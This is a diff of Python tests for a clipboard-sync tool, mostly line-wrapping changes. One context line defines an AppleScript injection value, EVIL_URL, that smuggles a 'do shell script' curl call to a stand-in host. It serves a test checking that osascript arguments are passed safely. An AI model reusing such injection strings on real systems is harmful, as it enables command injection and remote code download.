@@ -16,6 +16,7 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 # ── Platform simulation helpers ──────────────────────────────────────────
 
+
 class SimClipboard:
     """In-memory clipboard that simulates platform-specific behavior."""
 
@@ -134,8 +135,17 @@ class TestWindowsClipboardSim:
         bi_size_image = 4  # padded row
         dib_header = struct.pack(
             "<IiiHHIIiiII",
-            bi_size, bi_width, bi_height, bi_planes, bi_bit_count,
-            bi_compression, bi_size_image, 0, 0, 0, 0,
+            bi_size,
+            bi_width,
+            bi_height,
+            bi_planes,
+            bi_bit_count,
+            bi_compression,
+            bi_size_image,
+            0,
+            0,
+            0,
+            0,
         )
         pixel_data = b"\xff\x00\x00\x00"  # BGR + padding = blue pixel
         dib = dib_header + pixel_data
@@ -244,26 +254,32 @@ class TestCrossPlatformContentParity:
         from internal.clipboard.format import ClipboardContent, ContentType
 
         # Same logical content should hash the same
-        c1 = ClipboardContent(types={
-            ContentType.TEXT: b"text",
-            ContentType.HTML: b"<p>html</p>",
-        })
-        c2 = ClipboardContent(types={
-            ContentType.HTML: b"<p>html</p>",
-            ContentType.TEXT: b"text",
-        })
+        c1 = ClipboardContent(
+            types={
+                ContentType.TEXT: b"text",
+                ContentType.HTML: b"<p>html</p>",
+            }
+        )
+        c2 = ClipboardContent(
+            types={
+                ContentType.HTML: b"<p>html</p>",
+                ContentType.TEXT: b"text",
+            }
+        )
         assert c1.hash_key() == c2.hash_key()
 
     def test_format_priority_consistent(self):
         """HTML > RTF > TEXT > IMAGE_PNG priority is platform-independent."""
         from internal.clipboard.format import ClipboardContent, ContentType
 
-        c = ClipboardContent(types={
-            ContentType.IMAGE_PNG: b"img",
-            ContentType.TEXT: b"txt",
-            ContentType.RTF: b"rtf",
-            ContentType.HTML: b"html",
-        })
+        c = ClipboardContent(
+            types={
+                ContentType.IMAGE_PNG: b"img",
+                ContentType.TEXT: b"txt",
+                ContentType.RTF: b"rtf",
+                ContentType.HTML: b"html",
+            }
+        )
         fmt, data = c.best_format()
         assert fmt == ContentType.HTML
 
@@ -333,6 +349,7 @@ from internal.clipboard.history_db import ClipboardHistoryDB
 
 # ── #1 osascript argv passing (macOS write fallback) ──────────────────
 
+
 class _RunCapture:
     """Stand-in for subprocess.run that records every command."""
 
@@ -355,7 +372,7 @@ EVIL_URL = '" & do shell script "curl http://evil.example/x" & "'
 
 
 def test_osascript_argv_cmd_passes_values_as_arguments():
-    cmd = darwin._osascript_argv_cmd('on run argv\nend run', 'a"b', "-flag")
+    cmd = darwin._osascript_argv_cmd("on run argv\nend run", 'a"b', "-flag")
     assert cmd[:3] == ["osascript", "-e", "on run argv\nend run"]  # static source
     assert cmd[3:] == [darwin._ARGV_MARK + 'a"b', darwin._ARGV_MARK + "-flag"]
 
@@ -422,18 +439,19 @@ def test_write_atomic_invalid_utf8_file_data_falls_back(monkeypatch):
     # A FILE payload whose bytes are not valid UTF-8 (the 0xb8 opcode byte)
     # used to raise UnicodeDecodeError out of _write_atomic → HTTP 500 on
     # /api/paste-rich. It must fall back to the osascript _set_files path.
-    monkeypatch.setattr(
-        darwin, "_init_nspasteboard", lambda: (object(), object()))
+    monkeypatch.setattr(darwin, "_init_nspasteboard", lambda: (object(), object()))
     content = ClipboardContent(types={ContentType.FILE: b"bad-\xb8-name"})
     assert darwin._ClipboardWriter()._write_atomic(content) is False
 
 
 # ── #2 image_fmt exposed through storage and web API ──────────────────
 
+
 @pytest.fixture
 def history_db(tmp_path):
     return ClipboardHistoryDB(
-        storage_path=str(tmp_path / "history.db"), max_entries=50,
+        storage_path=str(tmp_path / "history.db"),
+        max_entries=50,
     )
 
 
@@ -447,7 +465,8 @@ def _bmp_entry(ts=1000.0):
 
 def _text(body: str, ts: float) -> ClipboardContent:
     return ClipboardContent(
-        types={ContentType.TEXT: body.encode("utf-8")}, timestamp=ts,
+        types={ContentType.TEXT: body.encode("utf-8")},
+        timestamp=ts,
     )
 
 
@@ -481,7 +500,9 @@ def test_api_history_exposes_image_fmt(history_db):
     assert item["image_fmt"] == "bmp"
 
     detail, status = get_history_item(
-        {"entry_id": [str(item["entry_id"])]}, history_db, _StubCfg(),
+        {"entry_id": [str(item["entry_id"])]},
+        history_db,
+        _StubCfg(),
     )
     assert status == 200
     assert detail["item"]["image_fmt"] == "bmp"
@@ -505,16 +526,15 @@ def test_api_history_local_clip_source_is_local_device_name(history_db):
     from internal.web.api.history import get_history, get_history_item
 
     cfg = _peer_cfg()
-    history_db.add(_text("hello", 1001.0))               # local clip: empty sid
+    history_db.add(_text("hello", 1001.0))  # local clip: empty sid
 
     payload, status = get_history(history_db, cfg)
     assert status == 200
     item = payload["items"][0]
     assert item["source_device"] == ""
-    assert item["source_name"] == cfg.device_name          # "Local", not "unknown"
+    assert item["source_name"] == cfg.device_name  # "Local", not "unknown"
 
-    detail, status = get_history_item(
-        {"entry_id": [str(item["entry_id"])]}, history_db, cfg)
+    detail, status = get_history_item({"entry_id": [str(item["entry_id"])]}, history_db, cfg)
     assert status == 200
     assert detail["item"]["source_name"] == cfg.device_name
 
@@ -575,6 +595,7 @@ def test_mobile_html_selects_mime_from_image_fmt():
 
 # ── #3 memory trim aligned with DB trim key ───────────────────────────
 
+
 def test_memory_trim_matches_db_trim_under_clock_skew(tmp_path):
     path = str(tmp_path / "history.db")
     db = ClipboardHistoryDB(storage_path=path, max_entries=3)
@@ -594,11 +615,7 @@ def test_memory_trim_matches_db_trim_under_clock_skew(tmp_path):
     assert mem == {"W", "Z", "Y"}
 
     conn = sqlite3.connect(path)
-    rows = {
-        r[0] for r in conn.execute(
-            "SELECT text_preview FROM history WHERE pinned = 0"
-        )
-    }
+    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history WHERE pinned = 0")}
     conn.close()
     assert rows == mem  # DB dropped exactly the same entry
 
@@ -610,8 +627,7 @@ def test_memory_trim_preserves_pinned_entries(tmp_path):
     db.add(_text("Y", ts=1000.0))
     db.add(_text("Z", ts=2000.0))
 
-    eid_y = next(e["entry_id"] for e in db.get_all()
-                 if e["text_preview"] == "Y")
+    eid_y = next(e["entry_id"] for e in db.get_all() if e["text_preview"] == "Y")
     assert db.batch_set_pinned([eid_y], True) == 1
 
     db.add(_text("W", ts=1500.0))  # 4 entries, 1 pinned -> keep top-2 unpinned
@@ -629,9 +645,9 @@ def test_memory_trim_preserves_pinned_entries(tmp_path):
 
 # ── #4 FILE_COMPLETE wait timeout reason ─────────────────────────────
 
+
 class TestFileCompleteTimeoutReason:
-    def test_completion_wait_timeout_reports_error_timeout(self, tmp_path,
-                                                           monkeypatch):
+    def test_completion_wait_timeout_reports_error_timeout(self, tmp_path, monkeypatch):
         from internal.sync import file_transfer as ft_mod
         from internal.sync.file_transfer import FileTransferManager
 
@@ -644,8 +660,7 @@ class TestFileCompleteTimeoutReason:
         mgr = FileTransferManager("test-device", str(tmp_path / "out"))
         completions = []
         mgr.set_on_transfer_complete(
-            lambda tid, ok, cancelled, status:
-                completions.append((tid, ok, cancelled, status)),
+            lambda tid, ok, cancelled, status: completions.append((tid, ok, cancelled, status)),
         )
 
         f = tmp_path / "hello.bin"
